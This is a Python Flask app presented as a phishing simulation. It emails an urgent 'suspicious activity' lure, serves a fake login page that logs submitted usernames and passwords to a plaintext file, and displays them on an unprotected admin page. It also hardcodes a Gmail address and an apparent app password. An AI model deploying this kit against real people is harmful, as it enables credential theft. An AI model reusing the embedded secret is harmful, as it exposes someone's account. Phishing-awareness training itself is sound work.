from flask import Flask, render_template, request, redirect, url_for
from flask_mail import Mail, Message
import os

app = Flask(__name__)

# Email config (use your Gmail or test account)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'manishjangid449@gmail.com'        # Replace with your email
app.config['MAIL_PASSWORD'] = 'zobr vjyc weht qlwf'           # Use App Password if 2FA enabled
app.config['MAIL_DEFAULT_SENDER'] = 'manishjangid449@gmail.com'

mail = Mail(app)

# Home Page - all accessible links
@app.route('/')
def home():
    return render_template('index.html')

# Send phishing email
@app.route('/send_email', methods=['GET', 'POST'])
def send_email():
    recipient = 'mksharma72400@example.com'  # Change this to your test email
    msg = Message("Urgent: Account Security Alert", recipients=[recipient])
    msg.html = """
    <html>
    <body>
        <h2 style="color: #D32F2F;">Urgent: Suspicious Activity Detected!</h2>
        <p>Dear User,</p>
        <p>We've detected suspicious login attempts on your account from an unrecognized device. 
        To secure your account and prevent unauthorized access, please <strong><a href="http://localhost:5000/login">click here</a></strong> to verify your identity.</p>
        <p>If you do not take action within 24 hours, your account may be temporarily locked for security reasons.</p>
        <br>
        <p style="color: #888;">This is an automated message. Please do not reply to this email.</p>
    </body>
    </html>
    """
    try:
        mail.send(msg)
        return redirect(url_for('email_sent'))  # Redirect to a confirmation page
    except Exception as e:
        return f"An error occurred while sending the email: {str(e)}"

# Confirmation page after sending the email
@app.route('/email_sent')
def email_sent():
    return '''
        <h1>Phishing Email Sent!</h1>
        <p>Check your inbox (or spam folder) for the email.</p>
        <p>Remember: Always be cautious of unsolicited requests for personal information.</p>
        <p><a href="/">Go Back to Home</a></p>
    '''

# Fake login page (for phishing simulation)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # Log the captured credentials
        with open('captured.txt', 'a') as f:
            f.write(f"Username: {username} | Password: {password}\n")

        return redirect(url_for('warning'))

    return render_template('phishing_login.html')

# Warning page after login attempt
@app.route('/warning')
def warning():
    return '''
        <h1>Warning</h1>
        <p>This is a simulated phishing page. Remember to never enter your credentials on untrusted websites.</p>
        <p><a href="/">Go Back to Home</a></p>
    '''

# Admin Dashboard to view captured credentials
@app.route('/admin')
def admin():
    # Read the captured credentials from the text file
    if not os.path.exists('captured.txt'):
        return "No data captured yet."
    
    with open('captured.txt', 'r') as f:
        captured_data = f.readlines()

    # Display captured data in a table
    return render_template('admin_dashboard.html', captured_data=captured_data)

if __name__ == '__main__':
    app.run(debug=True)
